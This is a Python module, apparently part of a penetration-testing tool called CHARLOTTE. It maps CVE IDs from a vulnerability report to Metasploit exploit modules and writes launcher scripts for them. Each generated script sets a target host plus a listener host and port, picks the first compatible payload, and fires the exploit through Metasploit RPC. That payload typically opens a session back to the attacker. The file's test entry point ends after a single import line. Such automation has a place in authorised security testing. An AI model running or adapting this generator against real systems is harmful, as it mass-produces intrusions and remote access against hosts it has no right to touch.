# ******************************************************************************************
# cve_autoscript.py
# Generates auto-exploit scripts for mapped Metasploit modules from CVE IDs
# ******************************************************************************************

import os
from plugins.exploitation.metasploit.msf_mapper import find_exploit_for_cve

# ==========================================================================================
# FUNCTION: generate_exploit_script()
# Auto-generates a Python script to launch a known exploit using CHARLOTTE's RPC interface
# ==========================================================================================
def generate_exploit_script(cve_id, client, rhost, lhost, lport, output_dir="generated_scripts"):
    os.makedirs(output_dir, exist_ok=True)

    exploits = find_exploit_for_cve(client, cve_id)
    if not exploits:
        print(f"[!] No exploits found for CVE {cve_id}. Skipping script generation.")
        return None

    script_path = os.path.join(output_dir, f"exploit_{cve_id}.py")
    selected_exploit = exploits[0]  # pick first for now

    content = f'''"""
Auto-generated exploit script for {cve_id}
"""
from pymetasploit3.msfrpc import MsfRpcClient

client = MsfRpcClient("msf", server="127.0.0.1", port=55553)

exploit = client.modules.use("exploit", "{selected_exploit}")
payloads = exploit.compatible_payloads
payload = client.modules.use("payload", payloads[0]) if payloads else None

if payload:
    exploit["RHOSTS"] = "{rhost}"
    payload["LHOST"] = "{lhost}"
    payload["LPORT"] = "{lport}"
    job_id = exploit.execute(payload=payload)
    print(f"[+] Exploit launched as Job ID: {{job_id}}")
else:
    print("[!] No compatible payload found.")
'''

    with open(script_path, "w", encoding="utf-8") as f:
        f.write(content)

    print(f"[+] Auto-exploit script saved: {script_path}")
    return script_path
# ==========================================================================================
# FUNCTION: generate_all_exploit_scripts()
# Generates scripts for all CVEs in the report
# ==========================================================================================
def generate_all_exploit_scripts(report_data, client, rhost, lhost, lport):
    output_dir = "generated_scripts"
    os.makedirs(output_dir, exist_ok=True)

    for vuln in report_data.get("vulnerabilities", []):
        cve_id = vuln.get("cve_id")
        if cve_id:
            generate_exploit_script(cve_id, client, rhost, lhost, lport, output_dir)
# ==========================================================================================
# FUNCTION: main()
# Main entry point for testing script generation
# ==========================================================================================
if __name__ == "__main__":
    from pymetasploit3.msfrpc import MsfRpcClient
